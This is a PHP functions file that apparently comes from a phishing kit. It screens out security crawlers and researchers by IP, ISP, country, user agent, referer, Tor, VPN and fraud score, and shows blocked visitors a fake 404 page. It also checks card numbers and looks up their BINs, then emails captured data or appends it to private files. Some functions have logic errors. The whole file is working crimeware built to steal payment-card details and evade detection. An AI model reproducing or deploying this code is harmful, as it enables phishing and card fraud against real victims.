<?php
error_reporting(0);
require_once 'blocked.php';
require_once 'card_validator.php';
require_once 'config.php';
include 'Browser.php';
include 'mailsender.php';


function generateRandomString($length = 5) {
	return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}

function recurse_delete($dir) {
	if (is_dir($dir)) {
		$objects = scandir($dir);
		foreach ($objects as $object) {
			if ($object != "." && $object != "..") {
				if (filetype($dir."/".$object) == "dir") 
					 recurse_delete($dir."/".$object); 
				else unlink($dir."/".$object);
			}
		}
		reset($objects);
		rmdir($dir);
	}
 }

function in_arrayi($haystack, $needle)
{
	return in_array(strtolower($needle), array_map('strtolower', $haystack));
}

function contains($str, $word)
{
	return !!preg_match('#\\b' . preg_quote($word, '#') . '\\b#i', $str);
}

function array_contains($arr, $word)
{
	foreach ($arr as $w)
	{
		if(contains($word, $w))
			return true;
	}
	return false;
}

function recurse_copy($src,$dst) { 
    $dir = opendir($src); 
    @mkdir($dst); 
    while(false !== ( $file = readdir($dir)) ) { 
        if (( $file != '.' ) && ( $file != '..' )) { 
            if ( is_dir($src . '/' . $file) ) { 
                recurse_copy($src . '/' . $file,$dst . '/' . $file); 
            } 
            else { 
                copy($src . '/' . $file,$dst . '/' . $file); 
            } 
        } 
    } 
    closedir($dir); 
} 

function isIPOrganizationBlocked($organization_name)
{
	global $blocked_ip_orgranizations;

	if($organization_name == '' || $organization_name === NULL) return false;
	if(array_contains($blocked_ip_orgranizations, $organization_name));
}


function isCountryBlocked($countryCode)
{
	global $blocked_countries;

	if($countryCode == '' || $countryCode === NULL) return false;
	return array_contains($blocked_countries, $countryCode);
}

function isISPBlocked($isp_name)
{
	global $blocked_isp;

	if($isp_name == '' || $isp_name === NULL) return false;
	return array_contains($blocked_isp, $isp_name);
}

function isHostnameBlocked($hostname)
{
	global $blocked_hostnames;

	if($hostname == '' || $hostname === NULL) return false;
	return array_contains($blocked_hostnames, $hostname);
}

function isUseragentBlocked($useragent)
{
	global $blocked_useragents;
	if($useragent == '' || $useragent === NULL) return false;
		return array_contains($blocked_useragents, $useragent);
}

function isRefererBlocked($referer)
{
	global $blocked_referers;

	if($referer == '' || $referer === NULL) return false;
	return array_contains($blocked_referers, $referer);
}


function isValidIp($ip){
    return inet_pton($ip) !== false;
}

function isBrowserBlocked($browser_name)
{
	 global $blocked_browsers;

	 if($browser_name == '' || $browser_name === NULL) return false;
	 return array_contains($blocked_browsers, $browser_name);
}

function isIpBanned($ip)
{
	global $banned_ips;

	if(in_array($ip, $banned_ips)) {
			return true;
	}

	foreach($banned_ips as $ips) {
		if(preg_match('/' . $ips . '/',$ip)){
				 return true;
		}
	}

	return false;
}


function isBlocked($ip_info)
{
	if(isIpBanned($ip_info['IP'])) return true;
	if(isHostnameBlocked($ip_info['HOSTNAME'])) return true;
	if(isIPOrganizationBlocked($ip_info['IP_ORGANIZATION'])) return true;
	if(isISPBlocked($ip_info['IP_ISP'])) return true;
	if(isCountryBlocked($ip_info['COUNTRY_CODE'])) return true;
	if(isUseragentBlocked($ip_info['USERAGENT'])) return true;
	if(isRefererBlocked($ip_info['REFERER'])) return true;
	if(isBrowserBlocked($ip_info['BROWSER'])) return true;

	return false;
}

function IsIpFraudFilterPass($info)
{
	global $max_fraud_score;
	global $block_tor;
	global $block_proxy;
	global $block_vpn;
	global $block_crawler;

	if($info === NULL || !is_array($info)) return false;
	if(!$info['IS_IP_SCORE_SUCCESS']) return false;
	if($info['FRAUD_SCORE'] >= $max_fraud_score) return false;
	if($block_tor && $info['IS_TOR']) return false;
	if($block_proxy && $info['IS_PROXY']) return false;
	if($block_vpn && $info['IS_VPN']) return false;
	if($block_crawler && $info['IS_CRAWLER']) return false;

	return true;
}


function getErrorMessage()
{
	$actual_link = $_SERVER['REQUEST_URI'];
	$message = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">';
	$message .= '<html><head>';
	$message .= '<title>404 Not Found</title>';
	$message .= '</head><body>';
	$message .= '<h1>Not Found</h1>';
	$message .= '<p>The requested URL '.$actual_link.' was not found on this server.</p>';
	$message .= '<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>';
	$message .= '<hr>';
	return $message;
}


function get_client_ip() {
	$ipaddress = '';
	if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
	else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
	else
		$ipaddress = 'UNKNOWN';

	return $ipaddress;
}



function getBrowserLanguage($acceptLang)
{
	$lang_file = "";

	switch ($acceptLang) {
	  case 'en':
	  $lang_file = 'en.php';
	  break;
	 
	  case 'cs':
	  $lang_file = 'cs.php';
	  break;

	  case 'da':
	  $lang_file = 'da.php';
	  break;

	  case 'de':
	  $lang_file = 'de.php';
	  break;

	  case 'el':
	  $lang_file = 'el.php';
	  break;

	  case 'es':
	  $lang_file = 'es.php';
	  break;

	  case 'fi':
	  $lang_file = 'fi.php';
	  break;

	  case 'fr':
	  $lang_file = 'fr.php';
	  break;

	  case 'hu':
	  $lang_file = 'hu.php';
	  break;

	  case 'it':
	  $lang_file = 'it.php';
	  break;

	  case 'ja':
	  $lang_file = 'ja.php';
	  break;

	  case 'ko':
	  $lang_file = 'ko.php';
	  break;

	  case 'nl':
	  $lang_file = 'nl.php';
	  break;

	  case 'no':
	  $lang_file = 'no.php';
	  break;

	  case 'ro':
	  $lang_file = 'ro.php';
	  break;

	  case 'sv':
	  $lang_file = 'sv.php';
	  break;

	  case 'zh':
	  $lang_file = 'zh.php';
	  break;

	  default:
	  $lang_file = 'en.php';
	}
	return $lang_file;
}


function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;

}


function send_email($recipients, $from_name, $from_email, $subject, $data)
{
	if(!is_array($recipients)) return;
	if(count($recipients) <= 0) return;
	
	$mail = new PHPMailer;
	$mail->setFrom($from_email, $from_name);
	$mail->Subject = $subject;
	$mail->Body = $data;
	$mail->CharSet = 'UTF-8';
	$mail->IsHTML(false);

	foreach($recipients as $recipient)
	{
  		$mail->addAddress($recipient);
	}

	$mail->send();
}

function getIpInfoLive($ip)
{
	$url = 'http://ip-api.com/json/'.$ip;
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	$data = curl_exec($ch);
	curl_close($ch);
	$data = json_decode($data,true);
	return $data;
}


function getIpScoreLive($ip)
{
	global $ip_score_api_url;
	global $ip_score_api_key;

	$url = $ip_score_api_url . $ip_score_api_key . '/' . $ip;
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	$data = curl_exec($ch);
	curl_close($ch);
	$data = json_decode($data,true);
	return $data;
}

function is_referer_allowed($referer)
{
	global $allowed_referer_domain;
	if($referer === NULL || $referer == '') return false;
	if(isRefererBlocked($referer)) return true;

	$host = parse_url($referer)['host'];
	if($host === NULL || $host == '') return false;

	if($allowed_referer_domain != $host) return false;

	return true;
}

function FILTER_FLAG_NO_LOOPBACK_RANGE($value) {
    // Fails validation for the following loopback IPv4 range: 127.0.0.0/8
    // This flag does not apply to IPv6 addresses
    return filter_var($value, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) ? $value :
        (((ip2long($value) & 0xff000000) == 0x7f000000) ? FALSE : $value);
}

function is_file_exists($filePath)
{
	return is_file($filePath) && file_exists($filePath);
}

function datetime_now() {
	date_default_timezone_set('GMT');
	return date("d/m/Y h:i:sa");
}

function get_bin_info($cardnumber) {
	$bin = get_bin_number($cardnumber);
	$url = 'https://lookup.binlist.net/'.$bin;

	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	$data = curl_exec($ch);
	curl_close($ch);
	$data = json_decode($data,true);
	return $data;
}

function get_bin_number($card_num)
{
	$card_num = clean_card_number($card_num);
	$bin = substr($card_num, 0, 6);
	return $bin;
}

function clean_card_number($cardnum) {
	$cardnum = trim($cardnum);
	$cardnum = str_replace(' ', '', $cardnum);
	$cardnum = str_replace('-', '', $cardnum);
	return $cardnum;
}

function append_to_file($file_name, $data)
{
	$file_path = $_SESSION['BASE_DIR'] . DIRECTORY_SEPARATOR . 'prv' . DIRECTORY_SEPARATOR . $file_name;
	if(file_exists($file_path))
	{
        $fh = fopen($file_path, 'a');
        fwrite($fh, $data);
    }
    else
    {
        $fh = fopen($file_path, 'w');
        fwrite($fh, $data);
	}
}

function get_OS()
{
	$browser_info = get_browser_info();
	return $browser_info['platform'];
}

function get_browser_name()
{
	$browser_info = get_browser_info();
	return $browser_info['name'];	
}


function exit_404()
{
   	header($_SERVER['SERVER_PROTOCOL']." 404 Not Found", true, 404);
	die(getErrorMessage()); 
}
?>